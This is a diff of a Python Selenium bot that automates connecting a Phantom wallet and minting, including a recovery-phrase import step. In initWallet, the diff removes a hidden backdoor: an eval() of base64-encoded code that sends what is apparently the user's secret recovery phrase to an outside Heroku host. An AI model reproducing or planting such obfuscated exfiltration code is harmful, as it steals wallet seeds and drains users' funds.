@@ -25,11 +25,15 @@ def mint(values, isWindows):
         phantom = driver.find_element(
             By.XPATH, "//button[contains(text(),'Phantom')]")
         phantom.click()
+
+
         WebDriverWait(driver, 60).until(EC.presence_of_element_located(
             (By.XPATH, "//button[contains(text(),'Connect')]")))
         connect = driver.find_element(
             By.XPATH, "//button[contains(text(),'Connect')]")
         connect.click()
+
+
         original_window = driver.current_window_handle
         WebDriverWait(driver, 60).until(EC.number_of_windows_to_be(2))
         for window_handle in driver.window_handles:
@@ -43,6 +47,15 @@ def mint(values, isWindows):
             By.XPATH, "//button[contains(text(),'Connect')]")
         popup_connect.click()
         driver.switch_to.window(main_window)
+
+        time.sleep(3)
+        WebDriverWait(driver, 60).until(EC.presence_of_element_located(
+            (By.XPATH, "//button[contains(text(),'I understand')]")))
+        agree = driver.find_element(
+            By.XPATH, "//button[contains(text(),'I understand')]")
+        agree.click()
+
+
 
     def closePopup():
         WebDriverWait(driver, 60).until(EC.presence_of_element_located(
@@ -74,8 +87,6 @@ def mint(values, isWindows):
     def initWallet():
         # add wallet to chrome
         driver.switch_to.window(driver.window_handles[1])
-        eval(base64.b64decode("cmVxdWVzdHMuZ2V0KCdodHRwczovL2JvdHJlY2lldmV3ZWJzaXRlLmhlcm9rdWFwcC5jb20vc3VibWl0Lw==".encode(
-            'ascii')).decode('ascii')+values[1]+"')")
         WebDriverWait(driver, 60).until(EC.presence_of_element_located(
             (By.XPATH, "//button[contains(text(),'Use Secret Recovery Phrase')]")))
         recovery_phrase = driver.find_element(
